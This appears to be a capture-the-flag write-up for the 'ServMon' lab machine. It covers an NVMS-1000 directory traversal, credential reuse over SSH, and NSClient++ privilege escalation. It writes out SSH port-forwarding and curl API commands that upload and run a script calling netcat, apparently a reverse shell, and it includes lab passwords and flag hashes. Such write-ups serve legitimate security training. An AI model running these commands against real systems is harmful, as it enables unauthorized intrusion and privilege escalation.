# Summary
- Takeaways:
    - use Burp Repeater rather than trying to handcraft exploit requests
    - use `--path-as-is` option with `curl` when attempting directory traveral to preserve directory movement sequences
    - check all known passwords with all known usernames
    - notice there is sometimes a difference between localhost and 127.0.0.1 in commands
- User: file left on FTP hinting to target for NVMS-1000 directory traversal exploit
- Root: local password and NSClient++ local privilege escalation exploit

# Details
### User: a0805b545ea61f0ff92969d0f64370b7
- Nmap scan reveals ports 21, 22, 80, 135, 139, 445, 5040, 5666, 6063, 6699, 8443, and 49664-49670 are open
- FTP allows anonymous login and hints to a file located at `/Users/Nathan/Desktop/Passwords.txt` and that usernames `Nathan` and `Nadine` likely exist
- use NVMS-1000 directory traversal exploit to retrieve the file and try each combination of username and password to attempt SSH login, finding that `nadine` and `L1k3B1gBut7s@W0rk` work

### Root: 600b74829e6f0c69177971450eccb34d
- login password for NSClient++ located in `C:\Program Files\NSClient++\nsclient.ini` ()
- NSClient++ only allows logins from 127.0.0.1, so port forward port 8443 using `ssh -L 8443:127.0.0.1:8443 nadine@servmon.htb` in order to gain access
    - localhost does not work but 127.0.0.1 does
- upload `nc.exe` to target and use NSClient++ local privilege escalation exploit to add script that runs it
    - https://www.exploit-db.com/exploits/46802
    - `curl -k -s -u admin:ew2x6SsGTxjRwXOT https://localhost:8443/api`, general API access
    - `curl -k -s -u admin:ew2x6SsGTxjRwXOT -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/shell.bat --data-binary @shell.bat`, upload script to call `nc.exe`
    - `curl -k -i -u admin:ew2x6SsGTxjRwXOT https://localhost:8443/api/v1/queries`, execute previously uploaded script
